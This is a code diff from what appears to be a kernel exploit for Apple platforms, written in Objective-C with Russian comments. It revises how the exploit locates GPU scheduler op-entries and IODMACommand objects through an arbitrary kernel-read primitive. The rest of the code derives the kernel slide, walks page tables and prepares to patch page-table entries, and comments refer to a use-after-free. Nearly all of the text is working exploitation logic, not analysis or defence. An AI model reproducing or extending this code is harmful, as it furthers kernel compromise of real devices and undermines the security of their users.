@@ -6658,79 +6658,61 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         // → DVA=[mapObj+0xa0] → pageIdx=DVA>>14 → walk L0/L1/L2/leaf (valid=bit0,
         // child=(e<<4)&0x3ffffffc000) → PTE. Патч ТОЛЬКО при совпадении PA-маски.
         uint64_t cmdVA = 0, dva = 0, dvaLen = 0;
-        // 1.9.170 (р.41): plane-struct INLINE в op-entry (ep+0x6f8 dst: surface
-        // ep+0x788, cmd ep+0x790 — поэтому хант указателем мимо был). Op-entry
-        // живёт в scheduler array: [pipe+0xb8] → [sched+0xc8]. Матч по
-        // [ep+0x788]==surfVA (credit после execute сброшен; записи висят в
-        // массиве и после completion — UAF-опыт teardown'а это доказал).
-        if (kpLooksLikeKernelPointer(provVA) && surfVA) {
-            // 1.9.175 (р.44): «scheduler» credit-pass = сам provider — массивы в
-            // нём: pending [provider+0xc8] (count [provider+0xb8]), credited
-            // [provider+0x110] (count2 [provider+0x100]). [pipe+0xb8] = per-pipe
-            // очередь (u16-таблица, не записи).
-            uint64_t schVA = provVA;
-            uint64_t earr = kp_untag_ptr(early_kread64(provVA + 0xc8));
-            kpNote(r, [NSString stringWithFormat:@"  [P2] scheduler=%#llx arr=%#llx — матч записей по [ep+0x788]==surfVA / [ep+0x48]==ucVA",
-                      (unsigned long long)schVA, (unsigned long long)earr]);
-            if (kpLooksLikeKernelPointer(earr)) {
-                // 1.9.172: [sched+0xc8] может быть OSArray с ВНУТРЕННИМ буфером —
-                // дамп первых qwords объекта; первый kernel-ptr сканируем как буфер
-                uint64_t inner = 0;
-                for (uint32_t o = 0; o + 8 <= 0x40; o += 8) {
-                    uint64_t q = early_kread64(earr + o);
-                    uint64_t u = kp_untag_ptr(q);
-                    kpNote(r, [NSString stringWithFormat:@"    arrObj+%#x: %#018llx%@", o, (unsigned long long)q,
-                              (!inner && kpLooksLikeKernelPointer(u) && kvtophys(u)) ? @" ← буфер?" : @""]);
-                    if (!inner && kpLooksLikeKernelPointer(u) && kvtophys(u)) inner = u;
-                }
-                if (inner) earr = inner;
-                // диагностика — дамп первых 8 живых записей с полями layout'а
-                int shown = 0, live = 0;
-                for (uint32_t i = 0; i < 384 && shown < 8; i++) {
-                    uint64_t ep = kp_untag_ptr(early_kread64(earr + i * 8));
-                    if (!kpLooksLikeKernelPointer(ep) || !kvtophys(ep)) continue;
-                    live++;
-                    if ((uint32_t)(ep & 0x3fff) + 0x798 > 0x4000) continue;
-                    uint64_t f48 = kp_untag_ptr(early_kread64(ep + 0x48));
-                    uint64_t f4c8 = kp_untag_ptr(early_kread64(ep + 0x4c8));
-                    uint64_t f788 = kp_untag_ptr(early_kread64(ep + 0x788));
-                    uint64_t f790 = kp_untag_ptr(early_kread64(ep + 0x790));
-                    kpNote(r, [NSString stringWithFormat:@"    запись[%u]=%#llx: [+0x48]=%#llx [+0x4c8]=%#llx [+0x788]=%#llx [+0x790]=%#llx%@",
-                              i, (unsigned long long)ep, (unsigned long long)f48,
-                              (unsigned long long)f4c8, (unsigned long long)f788, (unsigned long long)f790,
-                              f788 == surfVA ? @" ← НАША (surfVA)!" : (f48 == ucVA ? @" ← НАША (ucVA)!" : @"")]);
-                    shown++;
-                }
-                kpNote(r, [NSString stringWithFormat:@"  [P2] живых записей в первых 384: %d", live]);
-                // 1.9.173 (р.43): completed-записи во ВТОРОЙ коллекции [sched+0x110]
-                // (count2 [sched+0x100]) — pending [sched+0xc8] дренут. Скан обеих.
-                uint64_t arr2 = kp_untag_ptr(early_kread64(schVA + 0x110));
-                uint64_t cnt2 = early_kread64(schVA + 0x100);
-                kpNote(r, [NSString stringWithFormat:@"  [P2] completed array2=%#llx count2=%llu",
-                          (unsigned long long)arr2, (unsigned long long)cnt2]);
-                for (uint32_t pass = 0; pass < 2 && !cmdVA; pass++) {
-                    uint64_t a2 = pass ? earr : arr2;
-                    uint64_t n2 = pass ? 2048 : (cnt2 && cnt2 < 4096 ? cnt2 : 0);
-                    if (!kpLooksLikeKernelPointer(a2)) continue;
-                    for (uint32_t i = 0; i < n2 && !cmdVA; i++) {
-                        uint64_t ep = kp_untag_ptr(early_kread64(a2 + i * 8));
-                        if (!kpLooksLikeKernelPointer(ep) || !kvtophys(ep)) continue;
-                        if ((uint32_t)(ep & 0x3fff) + 0x798 > 0x4000) continue;
-                        if (kp_untag_ptr(early_kread64(ep + 0x788)) != surfVA &&
-                            kp_untag_ptr(early_kread64(ep + 0x48)) != ucVA) continue;
-                        kpNote(r, [NSString stringWithFormat:@"  [P2] наша запись %s[%u]=%#llx ✓",
-                                  pass ? "pending" : "array2", i, (unsigned long long)ep]);
-                        uint64_t cand = kp_untag_ptr(early_kread64(ep + 0x790));
-                        if (kpLooksLikeKernelPointer(cand) && kvtophys(cand)) {
-                            uint64_t cvt = kp_untag_ptr(early_kread64(cand));
-                            uint64_t cFile = cvt ? cvt - kslide2 : 0;
-                            kpNote(r, [NSString stringWithFormat:@"  [P2] cmd=[ep+0x790]=%#llx vt(file)=%#llx%@",
-                                      (unsigned long long)cand, (unsigned long long)cFile,
-                                      (uint32_t)cFile == 0x7afa9e8 ? @" = IODMACommand ✓" : @""]);
-                            if ((uint32_t)cFile == 0x7afa9e8) cmdVA = cand;
-                        }
+        // 1.9.176: marker-driven поиск op-entry — БЕЗ оффсетов коллекций. Запись
+        // держит [X+0x48]==ucVA (back-ref) и/или [X+0x788]==surfVA (dst surface).
+        // Скан всех ptr в prov/pipe/sched/uc: объект с таким полем = op-entry;
+        // буфер с таким объектом внутри = массив записей. kvtophys + page-guard.
+        uint64_t entryVA = 0;
+        uint64_t schVA = kpLooksLikeKernelPointer(pipeVA) ? kp_untag_ptr(early_kread64(pipeVA + 0xb8)) : 0;
+        {
+            uint64_t hosts[4] = { ucVA, provVA, pipeVA, schVA };
+            const char *hnames[4] = { "uc", "prov", "pipe", "sched" };
+            uint32_t hlims[4] = { 0x168, 0x400, 0x400, 0x400 };
+            for (int src = 0; src < 4 && !entryVA; src++) {
+                uint64_t host = hosts[src];
+                if (!kpLooksLikeKernelPointer(host) || !surfVA) continue;
+                for (uint32_t o = 0; o + 8 <= hlims[src] && !entryVA; o += 8) {
+                    uint64_t P = kp_untag_ptr(early_kread64(host + o));
+                    if (!kpLooksLikeKernelPointer(P) || !kvtophys(P)) continue;
+                    if ((uint32_t)(P & 0x3fff) + 0x798 > 0x4000) continue;
+                    if (kp_untag_ptr(early_kread64(P + 0x48)) == ucVA ||
+                        kp_untag_ptr(early_kread64(P + 0x788)) == surfVA) {
+                        entryVA = P;
+                        kpNote(r, [NSString stringWithFormat:@"  [P2] op-entry = %s+%#x → %#llx (прямой)%@",
+                                  hnames[src], o, (unsigned long long)P,
+                                  kp_untag_ptr(early_kread64(P + 0x788)) == surfVA ? @" [+0x788]=surfVA ✓" : @" [+0x48]=ucVA ✓"]);
+                        break;
+                    }
+                    if ((uint32_t)(P & 0x3fff) + 0x100 > 0x4000) continue;
+                    for (uint32_t o2 = 0; o2 + 8 <= 0x100; o2 += 8) {
+                        uint64_t E = kp_untag_ptr(early_kread64(P + o2));
+                        if (!kpLooksLikeKernelPointer(E) || !kvtophys(E)) continue;
+                        if ((uint32_t)(E & 0x3fff) + 0x798 > 0x4000) continue;
+                        if (kp_untag_ptr(early_kread64(E + 0x48)) != ucVA &&
+                            kp_untag_ptr(early_kread64(E + 0x788)) != surfVA) continue;
+                        entryVA = E;
+                        kpNote(r, [NSString stringWithFormat:@"  [P2] op-entry = %s+%#x → массив %#llx[%#x] = %#llx ✓",
+                                  hnames[src], o, (unsigned long long)P, o2, (unsigned long long)E]);
+                        break;
                     }
                 }
+            }
+        }
+        if (!entryVA) {
+            kpNote(r, @"  [P2] op-entry не найден marker-driven — умирает на completion (нужен cold-TLB рецепт)");
+        } else {
+            // cmd: dst = ep+0x790 (р.41); запасной src = ep+0x4d0 — vt-проверка обоих
+            for (uint32_t mo = 0x790; ; mo = 0x4d0) {
+                uint64_t cand = kp_untag_ptr(early_kread64(entryVA + mo));
+                if (kpLooksLikeKernelPointer(cand) && kvtophys(cand)) {
+                    uint64_t cvt = kp_untag_ptr(early_kread64(cand));
+                    uint64_t cFile = cvt ? cvt - kslide2 : 0;
+                    kpNote(r, [NSString stringWithFormat:@"  [P2] cmd=[ep+%#x]=%#llx vt(file)=%#llx%@",
+                              mo, (unsigned long long)cand, (unsigned long long)cFile,
+                              (uint32_t)cFile == 0x7afa9e8 ? @" = IODMACommand ✓" : @""]);
+                    if ((uint32_t)cFile == 0x7afa9e8) { cmdVA = cand; break; }
+                }
+                if (mo == 0x4d0) break;
             }
         }
         if (cmdVA) {
